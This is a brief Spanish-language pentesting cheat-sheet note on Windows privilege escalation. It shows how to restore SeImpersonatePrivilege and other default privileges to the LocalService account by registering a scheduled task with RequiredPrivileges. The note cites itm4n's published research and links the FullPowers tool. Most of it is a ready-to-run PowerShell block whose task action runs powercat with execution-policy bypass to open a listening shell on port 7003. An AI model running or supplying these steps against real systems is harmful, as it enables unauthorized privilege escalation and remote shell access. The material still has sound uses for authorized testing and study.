---
tags: [privesc, windows, localservice]
---

# Local Service sin Privilegios

Cuando `nt authority\local service` no tiene los privilegios que debería.

Referencia: https://itm4n.github.io/localservice-privileges/

Crear una tarea programada con `RequiredPrivileges` para recuperar `SeImpersonatePrivilege`.

## Pasos Manuales

```powershell
# 1. Lista de privilegios a recuperar
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege","SeAuditPrivilege","SeChangeNotifyPrivilege",
"SeCreateGlobalPrivilege","SeImpersonatePrivilege","SeIncreaseQuotaPrivilege",
"SeShutdownPrivilege","SeUndockPrivilege","SeIncreaseWorkingSetPrivilege","SeTimeZonePrivilege"

# 2. Principal de la tarea
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

# 3. Acción (reverse shell via powercat)
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\Public\powercat.ps1; powercat -l -p 7003 -ep`""

# 4. Registrar tarea
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask2" -Principal $TaskPrincipal

# 5. Lanzar
Start-ScheduledTask -TaskName "SomeTask2"
```

## Vía Rápida

Tool: https://github.com/itm4n/FullPowers/releases/tag/v0.1

